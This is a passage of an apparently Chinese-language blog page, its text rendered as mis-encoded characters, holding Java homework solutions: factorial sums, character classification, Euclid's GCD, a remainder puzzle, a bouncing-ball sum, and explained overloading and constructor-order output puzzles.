class="string">&quot;ç´¯åŠ ä¹‹å’Œä¸ºÂ %d,Â æ•°å­—Â nÂ ä¸ºÂ %d\n&quot;</span>,Â sum,Â n-<span class="number">1</span>);Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">int</span>Â <span class="title">fun</span><span class="params">(<span class="keyword">int</span>Â n)</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (nÂ ==Â <span class="number">1</span>Â ||Â nÂ ==Â <span class="number">0</span>)Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â nÂ *Â fun(nÂ -Â <span class="number">1</span>);Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â </span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>2. ä»æ ‡å‡†è¾“å…¥ç«¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ¤æ–­å­—ç¬¦æ˜¯æ•°å­—ã€è¿˜æ˜¯è¥¿æ–‡å­—æ¯è¿˜æ˜¯å…¶ä»–çš„å­—ç¬¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>Â java.util.Scanner;Â Â </span><br><span class="line">Â Â </span><br><span class="line"><span class="keyword">public</span>Â <span class="class"><span class="keyword">class</span>Â <span class="title">judge</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">void</span>Â <span class="title">main</span><span class="params">(String[]Â args)</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">while</span>Â (<span class="keyword">true</span>)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â ScannerÂ scannerÂ =Â <span class="keyword">new</span>Â Scanner(System.in);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(<span class="string">&quot;è¯·è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä»¥è¿›è¡Œåˆ¤æ–­ï¼Œè¾“å…¥Qç»“æŸç¨‹åºï¼š&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">char</span>Â cÂ =Â scanner.next().charAt(<span class="number">0</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (cÂ ==Â <span class="string">&#x27;q&#x27;</span>Â ||Â cÂ ==Â <span class="string">&#x27;Q&#x27;</span>)Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">break</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (cÂ &gt;=Â <span class="string">&#x27;a&#x27;</span>Â &amp;&amp;Â cÂ &lt;=Â <span class="string">&#x27;z&#x27;</span>Â ||Â cÂ &gt;=Â <span class="string">&#x27;A&#x27;</span>Â &amp;&amp;Â cÂ &lt;=Â <span class="string">&#x27;Z&#x27;</span>)Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(cÂ +Â <span class="string">&quot;æ˜¯ä¸€ä¸ªè¥¿æ–‡å­—æ¯&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">else</span>Â <span class="keyword">if</span>Â (cÂ &gt;=Â <span class="string">&#x27;0&#x27;</span>Â &amp;&amp;Â cÂ &lt;=Â <span class="string">&#x27;9&#x27;</span>)Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(cÂ +Â <span class="string">&quot;æ˜¯ä¸€ä¸ªæ•°å­—&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">else</span>Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(cÂ +Â <span class="string">&quot;æ˜¯å…¶ä»–å­—ç¬¦&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><ol start="3"><li>åˆ©ç”¨è¾—è½¬ç›¸é™¤æ³•ï¼ˆæ¬§å‡ é‡Œå¾—ç®—æ³•ï¼‰æ±‚ä¸¤ä¸ªæ­£æ•´æ•°çš„æœ€å¤§å…¬çº¦æ•°</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>Â java.util.Scanner;Â Â </span><br><span class="line">Â Â </span><br><span class="line"><span class="keyword">public</span>Â <span class="class"><span class="keyword">class</span>Â <span class="title">Euclidean</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">int</span>Â <span class="title">Greatest_common_divisor</span><span class="params">(<span class="keyword">int</span>Â num1,Â <span class="keyword">int</span>Â num2)</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (num1Â &lt;Â <span class="number">0</span>Â ||Â num2Â &lt;Â <span class="number">0</span>)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â -<span class="number">1</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (num2Â ==Â <span class="number">0</span>)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â num1;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">while</span>Â (num1Â %Â num2Â !=Â <span class="number">0</span>)Â &#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â numtempÂ =Â num1Â %Â num2;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â num1Â =Â num2;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â num2Â =Â numtemp;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">return</span>Â num2;Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">void</span>Â <span class="title">main</span><span class="params">(String[]Â args)</span>Â Â </span></span><br><span class="line"><span class="function">Â Â Â Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â a,b;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â ScannerÂ scannerÂ =Â <span class="keyword">new</span>Â Scanner(System.in);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.print(<span class="string">&quot;è¾“å…¥ç¬¬ä¸€ä¸ªæ•°å­—:Â &quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â aÂ =Â scanner.nextInt();Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.print(<span class="string">&quot;è¾“å…¥ç¬¬äºŒä¸ªæ•°å­—:Â &quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â bÂ =Â scanner.nextInt();Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â ans=Â Greatest_common_divisor(a,b);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.println(<span class="string">&quot;æœ€å¤§å…¬çº¦æ•°ä¸ºÂ &quot;</span>+Â ans);Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p><img src="/img/a56790bda968120f437b243d1a76580b.png"></p><ol start="4"><li>å‡è®¾ä¸€ä¸ªæ•°åœ¨1000åˆ°1100ä¹‹é—´ï¼Œé‚£é™¤ä»¥3ç»“æœä½™2,ï¼›é™¤ä»¥5ç»“æœä½™3,ï¼›é™¤ä»¥7ç»“æœä½™2ï¼ˆä¸­å›½å‰©ä½™å®šç†ï¼‰ï¼Œæ±‚æ­¤æ•°ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>Â java.util.Scanner;Â Â </span><br><span class="line">Â Â </span><br><span class="line"><span class="keyword">public</span>Â <span class="class"><span class="keyword">class</span>Â <span class="title">Chinese_remainder_theorem</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">void</span>Â <span class="title">main</span><span class="params">(String[]Â args)</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">for</span>Â (<span class="keyword">int</span>Â iÂ =Â <span class="number">1000</span>;Â iÂ &lt;=Â <span class="number">1100</span>;Â i++)Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â <span class="keyword">if</span>Â (iÂ %Â <span class="number">3</span>Â ==Â <span class="number">2</span>Â &amp;&amp;Â iÂ %Â <span class="number">5</span>Â ==Â <span class="number">3</span>Â &amp;&amp;Â iÂ %Â <span class="number">7</span>Â ==Â <span class="number">2</span>)Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â System.out.println(i);Â Â </span><br><span class="line">Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â </span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p><img src="/img/65cb9049e2667e84d16bf938c30fa639.png"></p><ol start="5"><li>å°çƒä»100ç±³é«˜åº¦è‡ªç”±è½ä¸‹ï¼Œæ¯æ¬¡è§¦åœ°ååå¼¹åˆ°åŸæ¥é«˜åº¦çš„ä¸€åŠï¼Œæ±‚ç¬¬10æ¬¡è§¦åœ°æ—¶ç»å†çš„æ€»è·¯ç¨‹ä»¥åŠç¬¬10æ¬¡åå¼¹é«˜åº¦</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>Â java.util.Scanner;Â Â </span><br><span class="line">Â Â </span><br><span class="line"><span class="keyword">public</span>Â <span class="class"><span class="keyword">class</span>Â <span class="title">ball</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â <span class="function"><span class="keyword">public</span>Â <span class="keyword">static</span>Â <span class="keyword">void</span>Â <span class="title">main</span><span class="params">(String[]Â args)</span>Â </span>&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â ScannerÂ scannerÂ =<span class="keyword">new</span>Â Scanner(System.in);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.print(<span class="string">&quot;è¾“å…¥é«˜åº¦:Â &quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">double</span>Â heightÂ =Â scanner.nextInt();Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.print(<span class="string">&quot;è¾“å…¥æ¬¡æ•°:Â &quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">int</span>Â nÂ =Â scanner.nextInt();Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">double</span>Â sumÂ =Â <span class="number">0</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">for</span>(<span class="keyword">int</span>Â iÂ =Â <span class="number">1</span>;i&lt;=n;i++)&#123;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â sumÂ =Â height+height/<span class="number">2</span>+sum;<span class="comment">//ä¸€æ¬¡è½åœ°è·ç¦»+å¼¹èµ·è·ç¦»+å·²ç»è¿‡è·¯ç¨‹Â Â </span></span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â height/=<span class="number">2</span>;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â System.out.printf(<span class="string">&quot;ç¬¬Â %dÂ æ¬¡å¼¹è·³é«˜åº¦ä¸º:Â %fç±³\n&quot;</span>,i,height);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â &#125;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.println(<span class="string">&quot;**************************&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â sum-=height;Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.println(<span class="string">&quot;å…±ç»è¿‡&quot;</span>+sum+<span class="string">&quot;ç±³&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â Â Â Â Â System.out.println(<span class="string">&quot;ç¬¬10æ¬¡å¼¹èµ·çš„é«˜åº¦ä¸ºï¼š&quot;</span>+height+<span class="string">&quot;ç±³&quot;</span>);Â Â </span><br><span class="line">Â Â Â Â &#125;Â Â </span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p><img src="/img/347bc5dd68d92ffabcdfb6ec45e52336.png"></p><h2 id="ä½œä¸šäºŒ"><a href="#ä½œä¸šäºŒ" class="headerlink" title="ä½œä¸šäºŒ"></a>ä½œä¸šäºŒ</h2><h3 id="è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š"><a href="#è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š" class="headerlink" title="è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š"></a>è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(D obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;A and D&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(A obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;A and A&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(B obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;B and B&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(A obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;B and A&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(C obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;C and C&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(B obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;C and B&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(D obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;D and D&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(B obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;D and B&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mainTest</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">A a1 = <span class="keyword">new</span> A();</span><br><span class="line">A a2 = <span class="keyword">new</span> B();</span><br><span class="line">B b = <span class="keyword">new</span> B();</span><br><span class="line">C c = <span class="keyword">new</span> C();</span><br><span class="line">D d = <span class="keyword">new</span> D();</span><br><span class="line">        System.out.println(a1.Show(b));</span><br><span class="line">        System.out.println(a1.Show(c));</span><br><span class="line">System.out.println(a1.Show(d));</span><br><span class="line">System.out.println(a2.Show(b));</span><br><span class="line">System.out.println(a2.Show(c));</span><br><span class="line">System.out.println(a2.Show(d));</span><br><span class="line">System.out.println(b.Show(b));</span><br><span class="line">System.out.println(b.Show(c));</span><br><span class="line">System.out.println(b.Show(d));</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><p>ç¬¬ä¸€ä¸ªè¾“å‡ºï¼šBè‡ªåŠ¨è½¬æ¢ä¸ºçˆ¶ç±»Aï¼Œå› æ­¤è¾“å‡ºA and Aï¼›</p><p>ç¬¬äºŒä¸ªè¾“å‡ºï¼šä¸ä¸Šé¢åŒç†ï¼Œè‡ªåŠ¨è½¬æ¢ä¸ºçˆ¶ç±»Aï¼Œå› æ­¤è¾“å‡ºA and Aï¼›</p><p>ç¬¬ä¸‰ä¸ªè¾“å‡ºï¼šè°ƒç”¨Aç±»çš„ç¬¬ä¸€ä¸ªShowå‡½æ•°ï¼Œè¾“å‡ºA and Aï¼›</p><p>ç¬¬å››ä¸ªè¾“å‡ºï¼šé¦–å…ˆå› ä¸ºå¼•ç”¨ç±»å‹ä¸ºAç±»ï¼Œæ‰€ä»¥ç³»ç»Ÿæƒ³è¦æ‰§è¡ŒAç±»çš„æ–¹æ³•ï¼Œä½†Aç±»å¹¶æ²¡æœ‰æ‰¾åˆ°ç±»å‹åŒ¹é…çš„æ–¹æ³•ï¼Œäºæ˜¯å°†å‚æ•°bè‡ªåŠ¨è½¬åŒ–ä¸ºçˆ¶ç±»ï¼Œæ‰§è¡ŒShow(A obj)æ–¹æ³•ï¼Œåˆå› ä¸ºa1å®é™…æŒ‡å‘äº†Bç±»çš„å¯¹è±¡ï¼Œå­ç±»Bé‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼Œå› æ­¤ä¼˜å…ˆæ‰§è¡Œå­ç±»çš„æ–¹æ³•ï¼Œäºæ˜¯è¾“å‡ºB and Aï¼›</p><p>ç¬¬äº”ä¸ªè¾“å‡ºï¼šä¸ä¸Šé¢åŒç†ï¼Œåªæ˜¯åˆå°†å‚æ•°cå¤šè½¬åŒ–äº†ä¸€æ­¥ï¼Œè¾“å‡ºB and Aï¼›</p><p>ç¬¬å…­ä¸ªè¾“å‡ºï¼šä¸ç¬¬å››ä¸ªç±»ä¼¼ï¼Œç”±äºa2çš„å¼•ç”¨ç±»å‹æ˜¯Aç±»ï¼Œè€Œclass AåŒ…å«Show(D obj)æ–¹æ³•ï¼Œå› æ­¤ç›´æ¥è¾“å‡ºA and Dï¼›</p><p>ç¬¬ä¸ƒä¸ªè¾“å‡ºï¼šç›´æ¥è°ƒç”¨Bçš„Show(B obj)æ–¹æ³•ï¼Œå› æ­¤è¾“å‡ºB and Bï¼›</p><p>ç¬¬å…«ä¸ªè¾“å‡ºï¼šå› ä¸ºæ²¡æœ‰åŒ¹é…çš„æ–¹æ³•ï¼Œå› æ­¤å‚æ•°cè‡ªåŠ¨è½¬æ¢ä¸ºçˆ¶ç±»Bï¼Œå› æ­¤è°ƒç”¨Show(B obj)æ–¹æ³•ï¼Œè¾“å‡ºB and Bï¼›</p><p>ç¬¬ä¹ä¸ªè¾“å‡ºï¼šå› ä¸ºBçš„çˆ¶ç±»Aç±»ä¸­æ–¹æ³•Show(D obj)åŒ¹é…ï¼Œå› æ­¤è°ƒç”¨æ­¤æ–¹æ³•è¾“å‡ºA and Dã€‚</p><h4 id="ç­”æ¡ˆï¼š"><a href="#ç­”æ¡ˆï¼š" class="headerlink" title="ç­”æ¡ˆï¼š"></a>ç­”æ¡ˆï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AÂ andÂ AÂ Â </span><br><span class="line">AÂ andÂ AÂ Â </span><br><span class="line">AÂ andÂ DÂ Â </span><br><span class="line">BÂ andÂ AÂ Â </span><br><span class="line">BÂ andÂ AÂ Â </span><br><span class="line">AÂ andÂ DÂ Â </span><br><span class="line">BÂ andÂ BÂ Â </span><br><span class="line">BÂ andÂ BÂ Â </span><br><span class="line">AÂ andÂ DÂ Â </span><br></pre></td></tr></table></figure><h3 id="è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š-1"><a href="#è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š-1" class="headerlink" title="è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š"></a>è¯»ç¨‹åºï¼Œå†™ç»“æœï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;base&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        tellName();&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tellName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base tell name: &quot;</span> + name); &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dervied</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;dervied&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dervied</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        tellName();&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tellName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dervied tell name: &quot;</span> + name);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">new</span> Dervied();    </span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†æï¼š-1"><a href="#åˆ†æï¼š-1" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><p>å½“ä¸»å‡½æ•°è¯­å¥new Dervied();æ‰§è¡Œæ—¶ï¼Œé¦–å…ˆåˆå§‹åŒ–Derviedç±»ï¼Œä½†åˆå› ä¸ºDerviedç±»ç»§æ‰¿äº†Baseç±»ï¼Œå› æ­¤å…ˆåˆå§‹åŒ–Baseç±»ã€‚Baseç±»çš„privateå˜é‡nameè¢«èµ‹åˆå€¼â€œbaseâ€ï¼Œç„¶åè¿›å…¥æ„é€ å‡½æ•°æ‰§è¡ŒtellName()ï¼Œä½†å› ä¸ºå­ç±»Baseé‡å†™äº†è¯¥æ–¹æ³•ï¼Œå› æ­¤å®é™…ä¸Šè¿›å…¥å­ç±»çš„tellName()å‡½æ•°æ‰§è¡Œï¼Œä½†æ˜¯æ­¤æ—¶å­ç±»çš„nameä»æœªåˆå§‹åŒ–ï¼Œå› æ­¤ä¸ºnullï¼Œè¾“å‡ºâ€œDervied tell name: nullâ€ã€‚ç„¶åå¼€å§‹å­ç±»åˆå§‹åŒ–ï¼ŒDerviedç±»çš„privateå˜é‡nameè¢«èµ‹åˆå€¼â€œderviedâ€ï¼Œç„¶åæ‰§è¡Œæ„é€ å‡½æ•°tellName()ï¼Œè¾“å‡ºâ€œDervied tell name: derviedâ€ã€‚</p><h4 id="ç­”æ¡ˆï¼š-1"><a href="#ç­”æ¡ˆï¼š-1" class="headerlink" title="ç­”æ¡ˆï¼š"></a>ç­”æ¡ˆï¼š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dervied tell name: null  </span><br><span class="line">Dervied tell name: dervied  </span><br></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šExample2ï¼šç”ŸæˆåŠ¨ç‰©"><a href="#ç»ƒä¹ 3ï¼šExample2ï¼šç”ŸæˆåŠ¨ç‰©" class="headerlink" title="ç»ƒä¹ 3ï¼šExample2ï¼šç”ŸæˆåŠ¨ç‰©"></a>ç»ƒä¹ 3ï¼šExample2ï¼šç”ŸæˆåŠ¨ç‰©</h3><p>é¦–å…ˆæ¥çœ‹Animalç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå…¶æ–¹æ³•åœ¨åé¢çš„å­ç±»è¿›è¡Œå®ç°ã€‚åŒ…æ‹¬getAnimalCount()ç”¨æ¥è·å–æ¯ä¸€ç±»åŠ¨ç‰©çš„æ•°é‡ï¼›Increaseanimals()ç”¨äºå¢åŠ æ¯ç±»åŠ¨ç‰©çš„ä¸ªæ•°ï¼›é™æ€å˜é‡sumallç”¨äºç»Ÿè®¡æ‰€æœ‰åŠ¨ç‰©çš„æ€»æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span 